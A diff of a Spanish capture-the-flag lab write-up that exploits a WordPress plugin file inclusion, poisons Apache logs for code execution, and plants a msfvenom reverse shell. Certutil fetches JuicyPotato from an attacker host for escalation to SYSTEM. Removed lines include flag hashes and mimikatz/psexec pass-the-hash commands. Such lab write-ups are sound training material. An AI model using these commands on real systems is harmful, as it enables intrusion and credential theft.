@@ -162,7 +162,7 @@ Obteniendo unos ficheros que debería examinar:
 
 Lo cargo en el navegador y me enseña esto:
 
-![XAMPP|450](/imgs/009-w-1.png)
+![XAMPP|450](009-w-1.png)
 
 Tengo un XAMPP instalado en un windows y ese fichero suele estar en:
 
@@ -196,9 +196,7 @@ http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/
 Si puedo leerlo. ¡Genial! Hemos confirmado la vulnerabilidad de inclusión de archivos locales (LFI) primero y ahora, debemos aprovechar esta vulnerabilidad para lograr la ejecución de código remoto (RCE).
 
 
-Vamos a utilizar la técnica de *log poisoning*, https://htb.linuxsec.org/web-application/file-inclusion#log-poisoning-to-rce
-
-Vamos a inyectar código PHP en el fichero de logs `access.log` de forma que luego podamos ejecutar comandos.
+Vamos a utilizar la técnica de *log poisoning* que consiste en inyectar código PHP en el fichero de logs `access.log` de forma que luego podamos ejecutar comandos.
 
 El parámetro de *curl* **-X** se utiliza para especificar el método que vamos a utilizar en la solicitud (get, post, put, delete, ...), sin embargo aquí en vez de poner un método añadimos la inyección. Esto dará un error que se almacenará en el access.log y como puedo leerlo, esa instrucción se interpretaría, con lo que tengo ya el RCE.
 También podría servir el parámetro **-A**, que especifica el *user-agent*
@@ -214,7 +212,7 @@ Y ahora lo invocamos con un comando de ejemplo `dir`
 http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=dir
 ```
 
-![cmd-dir|650](/imgs/009-w-2.png)
+![cmd-dir|650](009-w-2.png)
 # Acceso
 
 1. Vamos a crearnos una reverse shell, con msfvenom, para ejecutarla con ese mismo método que ejecuto los comandos. Utilizo esto, aunque podría subir un *nc.exe* pero en muchos sistemas windows el *nc.exe* no me funciona, este método es más fiable.
@@ -245,7 +243,7 @@ Explicación del comando:
 sudo python3 -m http.server 80
 ```
 
-![cmd-dir|650](/imgs/009-w-3.png)
+![http-server|650](009-w-3.png)
 
 * [...]\rev.exe, es el destino donde lo voy a guardar. Es un sitio poco visible para usuarios comunes. Además puedo ganar persistencia porque podría configurarse como tarea programada.
 
@@ -257,14 +255,13 @@ sudo python3 -m http.server 80
 
 He logrado acceder
 
-![cmd-dir|650](/imgs/009-w-4.png)
+![acceso|650](009-w-4.png)
 
 Y con este usuario puedo obtener la primera bandera
 
 ```zsh
 c:\Users\websvc\Desktop>type user.txt
-type user.txt
-4159a2b3a38697518722695cbb09ee46
+;-)
 ```
 
 
@@ -284,9 +281,9 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-Al tener habilitado `SeImpersonatePrivilege` puedo intentar un **Potato**
+Al tener habilitado `SeImpersonatePrivilege` puedo intentar algún **Potato**
 
-* GodPotato no lo puedo utilizar porque el sistema no es el adecuado
+* GodPotato no lo puedo utilizar porque el sistema no es el adecuado, es un 2008
 
 ```zsh
 c:\Users\websvc\Desktop>systeminfo
@@ -297,19 +294,20 @@ OS Name:                   Microsoft Windows Server 2008 R2 Enterprise
 ```
 
 * Intentamos con un *Juicy Potato*, https://github.com/ohpe/juicy-potato
+
 ##### Juicy-Potato
 
 1. Lo subo a la máquina
 
 ```zsh
-certutil -urlcache -split -f http://192.168.0.141:80/potato.exe potato.exe
+certutil -urlcache -split -f http://192.168.0.141:80/juicypotato.exe juicypotato.exe
 ```
 
 2. Ejecuto para comprobar y ver qué parámetros tengo que poner
 
 ```zsh
-c:\Users\websvc\Desktop>potato.exe
-potato.exe
+c:\Users\websvc\Desktop>juicypotato.exe
+jouicypotato.exe
 JuicyPotato v0.1 
 
 Mandatory args: 
@@ -332,7 +330,7 @@ En este caso, para windows server 2008 R2
 
 Me he creado un programa para que compruebe con juicypotato y la opción -z compruebe los CLSIDs correctos. El resultado ha sido:
 
-![cmd-dir|550](/imgs/009-w-5.png)
+![CLSIDs|550](009-w-5.png)
 
 Lógicamente me interesan los `NT AUTHORITY\SYSTEM` pruebo con el primero:
 
@@ -368,24 +366,5 @@ Y ya puedo capturar la bandera:
 
 ```console
 C:\Users\Administrator\Desktop>type root.txt
-type root.txt
-5b38df6802c305e752c8f02358721acc
-```
-
-
-
-### Post Exploitation
-
-We have already gained shell access as NT SYSTEM. Why not steal the Administrator hash and perform a Pass-The-Hash attack? Let’s do this using Mimikatz. - https://github.com/gentilkiwi/mimikatz
-
-Run this command:
-
-```zsh
-mimikatz.exe privilege::debug token::elevate lsadump::sam exit
-```
-
-And then, we can access the target using impacket-psexec and the Administrator NTLM hashes.
-
-```zsh
-impacket-psexec Administrator@**target-ip** -hashes :**hash_here**
+;-)
 ```
